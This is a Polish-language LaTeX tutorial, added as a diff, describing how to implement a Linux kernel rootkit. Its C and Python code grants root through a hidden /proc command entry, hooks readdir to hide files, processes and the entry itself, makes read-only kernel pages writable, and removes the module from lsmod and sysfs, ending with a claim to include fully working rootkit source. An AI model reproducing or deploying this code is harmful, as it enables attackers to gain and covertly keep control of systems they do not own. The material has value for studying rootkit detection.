@@ -1,0 +1,399 @@
+\documentclass[a4paper]{article}
+\usepackage[utf8x]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage[polish]{babel}
+\usepackage{minted}
+\begin{document}
+\title{Prosta, wysokopoziomowa implementacja rootkita dla Linuksa.}
+\author{Arkadiusz ,,Ivyl'' Hiler \and Michał ,,t3hknr'' Winiarski}
+\date{Styczeń 2012}
+\maketitle
+\newpage
+\begin{abstract}
+Opis metod i technik użytych przy implementacji modułu jądra umożliwającego intruzowi utrzymanie kontroli nad systemem
+oraz ukrycie swoich działań.
+
+Moduł umożliwia uzyskanie praw roota oraz ukrycie plików, procesów oraz samego siebie. 
+Wydawanie rozkazów jak i sprawdzanie stanu rootkita odbywa sie za pomocą ukrytego wpisu w \texttt{/proc}.
+
+Pełen kod rootkita został zamieszony na końcu ninejszego dokumenu oraz na
+\texttt{https://github.com/ivyl/rootkit}
+\end{abstract}
+
+\newpage
+\tableofcontents
+\newpage
+
+\section{Wstęp}
+\subsection{Metody zdobywania wiedzy}
+Podstawowy opis struktur \texttt{file} i \texttt{file\_operations}, techniki
+debugowania, czy budowy i uruchamiania modułów można znaleźć w ,,Linux Device
+Drivers''\cite{ldd3}. Następny w kolejności źródłem infromacji jest sam kod
+źródłowy kernela. Poszukiwanie funkcji najlepiej zacząć od przeszukania plików
+nagłówkowych zawierających ich deklaracje (katalog \texttt{include/}). Łatwo
+można skonstruować wyrażenia regularne szukające prototypu zwracającego
+interesujący nas typ i zawierającego interesujące nas słowo. Szukania
+przykładowego użycia można dokonać w pozostałych katalogach, zawierających
+sterowniki i samą implementację. Do przeglądania zagadnień najlepiej nadaje
+się dokumentacja jądra (\texttt{Documentation/}). W dokumencie ograniczymy się
+do pobieżnej analizy potrzebnych nam funkcji i struktur, pomijając nieistotne
+pola. Zachęcamy do pełnej samodzielnej analizy plików nagłówkowych.
+
+
+\subsection{Środowisko}
+Moduł zbudowany w oparciu o przedstawione techniki z powodzeniem był
+kompilowany oraz działa na jądrze 3.1.0 oraz 3.1.5. Użyto gcc w wersji 4.6.x.
+Nie powinno być jednak problemu z innymi wersjami gcc jak i jądrami w wersji
+większej lub równej od 2.6.26 (wcześniej nie była eksportowana funkcja
+\texttt{lookup\_address}). Testy przeprowadzono zarówno na jądrze
+skompilowanym pod architekturzę x86 jak i x86\_64.
+
+
+\section{Makefile}
+Użyliśmy standardowgo pliku \texttt{Makefile} opisanego w LDD\cite{ldd3}:
+\begin{minted}[frame=lines,framesep=2mm]{makefile}
+ifneq ($(KERNELRELEASE),)
+	obj-m := rt.o
+else
+	KERNELDIR ?= /lib/modules/$(shell uname -r)/build
+	PWD := $(shell pwd)
+
+default:
+	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules
+
+endif
+\end{minted}
+Wykonanie polecenia make powoduje samodzielnie ustawienie środowiska do
+budowania na podstawie symlinku build w katalogu zawierającym moduły aktualnie
+używanego jądra.
+
+
+\section{Właściwa implementacja}
+\subsection{Struktura modułu}
+Stworzenie nowego modułu wymaga oznaczenia dwóch funkcji za pomocą makr 
+\texttt{module\_init} i \texttt{module\_exit} (plik nagłówkowy \texttt{linux/init.h}).
+Prototypy jak w przykładzie:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+#include <linux/init.h>
+#include <linux/module.h>
+
+MODULE_LICENSE("Dual BSD/GPL");
+MODULE_AUTHOR("Arkadiusz Hiler<ivyl@sigillum.cc>");
+MODULE_AUTHOR("Michal Winiarski<t3hkn0r@gmail.com>");
+
+static int __init rootkit_init(void) {
+	
+	return 0;
+}
+
+static void __exit rootkit_exit(void) {
+
+}
+
+module_init(rootkit_init);
+module_exit(rootkit_exit);
+\end{minted}
+
+\texttt{\_\_init} oraz \texttt{\_\_exit} to makra oznaczające funkcje
+używane jedynie przy ładowaniu/zwalnianiu modułu, dzięki czemu może zwolnić
+zajmowane przez nie zasoby.
+
+Znaczenie makr \texttt{MODULE\_AUTHOR} oraz \texttt{MODULE\_LICENSE}
+(\texttt{linux/module.h}) jest oczywiste.
+
+Na szczególną uwagę zasługuje użycie modyfikatora \texttt{static}. Gwarantuje
+on nam, że funkcja nie jest widoczna na zewnątrz naszego kodu (żadne symbole
+nie są eksportowane). Postaramy się używać go przy każdej definicji w celu
+lepszego ukrycia modułu jądra.
+
+\subsection{Wpis w /proc}
+Interesujące nas funkcje znajdują się w pliku nagłówkowym
+\texttt{linux/proc\_fs.h}.
+\begin{minted}{c}
+struct proc_dir_entry *create_proc_entry(const char *name,
+        mode_t mode, struct proc_dir_entry *parent);
+\end{minted}
+Pierwszy parametr to zwyczajnie nazwa, drugi to tryb dostępu, najłatwiej podać
+ósemkowo. Ostatnim parametrem jest rodzic w procfs, gdy podamy \texttt{NULL},
+wpis tworzony jest w procfs root.
+
+Należy pamiętać o sprawdzaniu czy zwracana jest poprawna struktura (nie
+\texttt{NULL}). Przy wyładowywaniu modułu należy pamiętać o usunięciu wpisu:
+\begin{minted}{c}
+remove_proc_entry(const char *name, struct proc_dir_entry *parent);
+\end{minted}
+
+Struktura \texttt{proc\_dir\_entry} zwracana przez powyższą funkcję zawiera
+m.in. wskaźniki na funkcje używane przy odczycie/zapisie do pliku.
+Interesujące nas pola to \texttt{read\_proc} oraz
+\texttt{write\_proc}\cite{lkmpg}. Prototypy funkcji na które wskazują:
+
+\begin{minted}{c}
+int read(char *buffer, char **buffer_location, off_t off,
+        int count, int *eof, void *data);
+
+int write(struct file *file, const char __user *buff,
+        unsigned long count, void *data);
+\end{minted}
+
+\subsubsection{Read}
+Pierwsza funkcja zwrotna jest wywoływana gdy odczytujemy z pliku. Pierwszym
+paramterem jest bufor, do którego mamy zapisywać, drugi to jego położenie w
+pamięci, można użyć np. do zaalokowania własnego bufora, trzeci to offset, od
+którego chcemy zacząć czytać, czwarty to rozmiar buffora, który dostaliśmy,
+piąty wskazuje eof (po wpisaniu 1 pod adres), szóty to wkaźnik na dodatkowe
+dane. Funkcja zwraca liczbę wypisanych znaków.
+
+
+Przykładowa bezpieczna implementacja przy założeniu, że mamy zaalokowany
+odpowiednio duży \texttt{char[] module\_status}:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+int rtkit_read(char *buffer, char **buffer_location,
+        off_t off, int count, int *eof, void *data) {
+	int size;
+	
+	//build module_status
+	
+	size = strlen(module_status);
+
+	if (off >= size) return 0;
+  
+	if (count >= size-off) {
+		memcpy(buffer, module_status+off, size-off);
+	} else {
+		memcpy(buffer, module_status+off, count);
+	}
+  
+	return size-off;
+}
+\end{minted}
+Podana wyżej implementacja gwarantuje nam nieprzekroczenie obszaru bufora,
+zakończneie odczytu (zwrócenie zero przy próbie odczytu poza obszarem, nie używamy eof)
+oraz poprawną obsługę programów do czytania stronami (less, more) dzięki obsłudze offsetu.
+
+\subsubsection{Write}
+Parametrami, które nas interesują jest \texttt{buff}, czyli bufor wejściowy
+oraz \texttt{count} czyli rozmiar danych przekazanych w buforze. Pozostałe
+parametry to struktura file opisująca plik do którego piszemy oraz wskaźnik na
+dodatkowe dane. Funkcja zwraca liczbę przetworzonych znaków.
+
+Wystarczy porównywać zawartość bufora z komendą i wyciągnąć ewentualne
+dodatkowe informacje. Należy pamiętać o rozmiarze bufora i liczbie znaków.
+\begin{minted}[frame=lines,framesep=2mm]{c}
+int rtkit_write(struct file *file, const char __user *buff,
+    unsigned long count, void *data) {
+	if (!strncmp(buff, "secreet pass", MIN(11, count))) { }
+	
+	return count;
+}
+\end{minted}
+
+Powyżej użyte zostało makro:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+#define MIN(a,b) \
+   ({ typeof (a) _a = (a); \
+       typeof (b) _b = (b); \
+     _a < _b ? _a : _b; })
+\end{minted}     
+
+\subsubsection{Podniesienie uprawnień}
+W pliku nagłówkowym \texttt{linux/cred.h} znajduje się funkcje które pozwalają
+na pobranie uprawnień aktualnie wykonywanego procesu oraz ich ponowne
+zapisanie. \texttt{prepare\_creds()} zwraca nam strukturę cred z informacjami
+o bieżacym procesie i jego uprawnienaich, zaś \texttt{commit\_creds(struct
+cred*)} ustawia procesowi nowe wartości na podstawie podanej struktury.
+Interesują nas pola uid, gid, euid oraz egid (user id, group id oraz ich
+efektywne wersje). W pobranej strukturze należy zmienić wartość tych pól na 0
+(root) po czym zatwierdzić nowe ustawienia.
+\begin{minted}[frame=lines,framesep=2mm]{c}
+struct cred *credentials = prepare_creds();
+credentials->uid = credentials->euid = 0;
+credentials->gid = credentials->egid = 0;
+commit_creds(credentials);
+\end{minted}
+Wewnątrz funkcji write aktualnie wykonywnem procesem będzie proces, który
+pisał do pliku w \texttt{/proc}, więc można tam dokonać zmiany.
+
+\subsubsection{Uwagi}
+Łatwo złożyć powyższe informacje w całość, która po wydaniu odpowiedniego
+rozkazu do wpisu w \texttt{/proc} daje nam uprawnienia roota. Obie funkcje
+(read i wrtie) są w zasadzie gotowe do przypisania do odpowienich pól
+struktury.
+
+Do budowy odpowiedzi jak i sprawdzania wejścia możemy użyć funkcji z
+\texttt{linux/string.h}. Znajdziemy tam klasyczne funkcje
+porównania(\texttt{strcmp}, \texttt{strncmp}) budowy łańcuchów
+(\texttt{sprintf}) czy kopiowania.
+
+\subsection{Wydawanie rozkazów poprzez wpis}
+\begin{minted}[frame=lines,framesep=2mm]{python}
+#!/usr/bin/env python
+import sys
+import os
+
+def order(command):
+    f = open("/proc/rtkit", "w")
+    f.write(command)
+    f.close()
+
+if len(sys.argv) > 1:
+    order(sys.argv[1])
+
+if len(sys.argv) > 2:
+    os.execl(sys.argv[2], "")
+\end{minted}
+Powyższy program zapisuje pierwszy przekazany argument do wpisu w
+\texttt{/proc}. Jeżeli podany jest drugi argument, to uruchamiany jest
+wskazywany przezeń program (np. po dostaniu roota odpalamy powłokę bash).
+
+
+\subsection{Ukrycie wpisów w \texttt{/proc}}
+\subsubsection{Użyteczność}
+Ukrywanie plików w \texttt{/proc} może posłużyć do ukrycia wpisu stworzonego
+przez nas jak i ukrycia procesów w systemie. Programy pokroju \texttt{ps} i
+\texttt{top} listują katalogi w \texttt{/proc} reprezentujące procesy. Ukrycie
+tych katalogów skutkuje ukryciem procesów.
+
+\subsubsection{Wyciągnięcie \texttt{file\_operations}}
+Zmian tych można dokonać poprzez zastąpienie używanej funkcji
+\texttt{readdir}, która zamienia funkcję \texttt{filldir} przekazywaną do
+oryginału. Wskaźnik do funkcji \texttt{readdir} znajduje się w strukturze
+\texttt{file\_operations}. Interesuje nas struktura dla \texttt{/proc}.
+Wskaźnik na \texttt{file\_operations} można znaleść w strukturze
+\texttt{proc\_dir\_entry}. Nasz nowo utworzony plik w \texttt{/proc} zawiera
+wskaźnik na rodzica - w tym wypadku sam \texttt{/proc}. Pole
+\texttt{proc\_fops} zawiera interesującą nas strukturę.
+
+\mint{c}|proc_rtkit->parent->proc_fops|
+
+\subsubsection{Własne \texttt{readdir} i \texttt{filldir}}
+Własna wersja \texttt{readdir} ma za zadanie jedynie opakować oryginalne
+\texttt{filldir} w naszą własną wersję. Uzywamy do tego globalnej statycznej
+zmiennej. \texttt{filldir} natomiast ma zwracać 0 jeśli chemy ukryć wpis lub
+też wywoływać oryginał. Pozwolimy pominąć sobie opis prototypów funkcji i
+przejść do implementacji:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+int proc_readdir_new(struct file *filp, void *dirent, filldir_t filldir) {
+	proc_filldir_orig = filldir; //some static variable
+	return proc_readdir_orig(filp, dirent, proc_filldir_new);
+}
+
+int proc_filldir_new(void *buf, const char *name, int namelen, loff_t offset,
+u64 ino, unsigned d_type) {
+	if (!strcmp(name, "rtkit")) return 0;
+	return proc_filldir_orig(buf, name, namelen, offset, ino, d_type);
+}
+\end{minted}
+Użycie globalnej zmiennej nie powoduje kłopotów w razie przypadkowego
+wywłaszczenia. \texttt{filldir} jest zawsze takie samo, nie ma niestety innego
+sposobu na jego wyciągniecie niż zrobieni tego w ciele \texttt{readdir}.
+
+\subsubsection{Zmiana trybu dostepu do strony w pamięci}
+Niestety bezpośrednia podmiana wskaźnika w strukturze nie jest możliwa z dwóch
+powodów. Po pierwsze, wskaźnik jest typu \texttt{const} i potrzebne jest
+odpowiednie rzutowanie, po drugie ze wzgledu na oznaczenie strony pamięci, na
+której znajduje się struktura \texttt{file\_operations} jako tylko do odczytu.
+Kończy się to błędem typu Kernel Oops z komunikatem ,,unable to handle kernel
+paging'' istnieje kilka metod zmiany trybu strony, jednak większość ma pewne
+dodatkowe ograniczenia (np. nie zmienianie trybu strony znajdującej się w
+obszarze .rodata). W kernelu w wersji 2.6.26 lub wyższej eksportowana jest
+metoda o prototypie\cite{stovf1}:
+\mint{c}|pte_t *lookup_address(unsigned long addr, unsigned int *level);|
+
+Wyciąga ona struturę \texttt{pte\_t} zawierającą pole \texttt{pte} pozwalające
+na zmianę trybu dostępu (maska bitowa). Interesuje nas ustawienie
+\texttt{\_PAGE\_RW} po czym posprzątanie po sobie.
+
+Wymaga to od nas rzutowania wskaźnika na struturę na typ \texttt{unsigned
+long}. Ze względu na potrzebę użycia tego w kilku miejscach stwórzmy sobie
+metody pomocnicze:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+void set_addr_rw(void *addr) {
+	unsigned int level;
+	pte_t *pte = lookup_address((unsigned long) addr, &level);
+	if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+void set_addr_ro(void *addr) {
+	unsigned int level;
+	pte_t *pte = lookup_address((unsigned long) addr, &level);
+	pte->pte = pte->pte &~_PAGE_RW;
+}
+\end{minted}
+Przez wkaźnik przekazywany jako drugi parametr zwracany jest poziom strony,
+który ignorujemy. Po wykonaniu \texttt{set\_addr\_rw(proc\_fops)} można
+dokonać podmiany, po czym należy wrócić do trybu tylko do odczytu:
+\begin{minted}[frame=lines,framesep=2mm]{c}
+set_addr_rw(proc_fops);
+proc_fops->readdir = proc_readdir_new;
+set_addr_ro(proc_fops);
+\end{minted}
+Pamiętajmy też o zapamiętaniu oryginału, by móc przywrócić stan pierwotny przy
+wyładowywaniu modułu.
+
+\subsection{Ukrycie wpisów w systemie plików}
+\subsubsection{Wyciągnięcie \texttt{file\_operations}}
+Wszystko odbywa się analogicznie do ukrywania wpisów w \texttt{/proc}. Jedynej
+trudności nastręcza wyciągniecie struktury \texttt{file\_operations}. Systemy
+plików rejestrowane są w podsystemie VFS. Stamtąd można wyciągnąć jedynie
+wkaźnik na funkcję używaną do montowania dla systemu plików o konkretnej
+nazwie. Najlepszą i najbezpieczniejszą metodą (gwarantującą podmianą readdir
+dla używanego systemu plików) jest użycie funkcji:
+\mint{c}|struct file *filp_open (const char *filename, int flags, int mode);|
+Jako flags podajemy \texttt{O\_RDONLY}, mode jest istotny tylko przy użyciu
+flagi \texttt{O\_CREAT}, więc podajemy cokolwiek. Najlepiej otworzyć folder,
+którego istnienia zawsze jesteśmy pewni, np. \texttt{/etc}. Struktura file
+zawiera pole f\_op będące wskaźnikiem na \texttt{file\_operations} (pamiętać o
+rzutowniu, jest typu \texttt{const}, oraz o zmianie trybu strony). Po czym
+plik należy zamknąć
+\mint{c}|int filp_close(struct file *filp, fl_owner_t id);|
+ID dotyczy wątku zarządzającego, podajemy \texttt{NULL} Funkcje te opisane są
+w pliku nagłówkowym \texttt{linux/fs.h}.
+
+\subsection{Ukrycie modułu}
+Podstawowym zabiegiem jest wcześniej wspomniane używanie modyfikatora
+\texttt{static}. Dzięki temu unikniemy pojawienia się wpisów w
+\texttt{/proc/kallsyms}. Dodatkowo należy usunać moduł z listy modułów (nie
+będzie widoczny przez lsmod) i zadbać o wyrejestrowanie obiektów
+\texttt{kobject}, które mają swoją reprezentację w \texttt{/sys}. Posłużymy
+się metodami \texttt{list\_del(struct list\_head*)} oraz
+\texttt{kobject\_del(struct kobject*)}.
+
+\begin{minted}[frame=lines,framesep=2mm]{c}
+list_del(&THIS_MODULE->list);
+kobject_del(&THIS_MODULE->mkobj.kobj);
+list_del(&THIS_MODULE->mkobj.kobj.entry);
+\end{minted}
+\texttt{THIS\_MODULE} to makro dające dostęp do struktury opisjącej bieżący
+moduł.
+
+Można zapamiętać poprzedniki (pole \texttt{prev}) w celu powrotnego dodania na
+rozkaz (umożliwienie wyładowania modułu).
+
+\section{Podsumowanie}
+Z odrobiną własnej inwencji można złożyć powyższe w całość, zaimplementować
+rozkaz ukrywania PIDów, itd. Poniżej zamieściliśmy listnig kodu w pełni
+funkcjonującego rootkita.
+
+\section{Pełen kod}
+\inputminted[linenos,fontsize=\footnotesize]{c}{../rt.c}
+
+\begin{thebibliography}{9}
+\bibitem{ldd3}
+  Jonathan Corbet, Alessandro Rubini, and Greg Kroah-Hartman
+  \emph{Linux Device Drivers}.
+  O'Reilly,
+  3rd Edition,
+  2005.
+
+\bibitem{stovf1}
+  Corey Henderson
+  \emph{Linux Kernel: System call hooking example}, Stackoverflow discussion.
+  http://stackoverflow.com/questions/2103315/linux-kernel-system-call-hooking-example
+  
+\bibitem{lkmpg}
+  Peter Jay Salzman, Michael Burian, and Ori Pomerantz
+  \emph{The Linux Kernel Module Programming Guide}.
+  http://linux.die.net/lkmpg/
+\end{thebibliography}
+\end{document}
